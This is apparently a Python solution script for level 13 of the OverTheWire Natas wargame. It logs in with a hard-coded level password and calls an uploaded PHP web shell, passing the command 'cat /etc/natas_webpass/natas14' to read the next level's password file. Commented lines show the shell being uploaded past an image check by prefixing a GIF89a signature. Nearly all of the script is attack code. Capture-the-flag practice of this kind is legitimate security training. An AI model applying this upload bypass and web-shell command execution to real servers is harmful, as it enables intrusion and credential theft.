#Import Library
import requests
import re
import base64

#Setting variables needed
username = 'natas13'
password = 'jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY'

url = f'http://{username}.natas.labs.overthewire.org/upload/s3m4l91lbq.php?e=cat /etc/natas_webpass/natas14'
#Set the payload up
#payloads={"MAX_FILE_SIZE":"1000","filename":"a.php", "submit":"Upload File"}

#Set up 'files' to upload a PHP file
#Before upload the file, I added a signiture of GIF(GIF89a) on the first line
#files = {"uploadedfile":open("/Users/KBJoon/Desktop/a.php",'rb')}

#Connect to natas
session = requests.Session()

response = session.request('POST', url, auth=(username,password))

#Filtering to get a password
result = response.text
#result = re.findall('The password for natas12 is (.*)<br>', response.text)[0]

print(result)
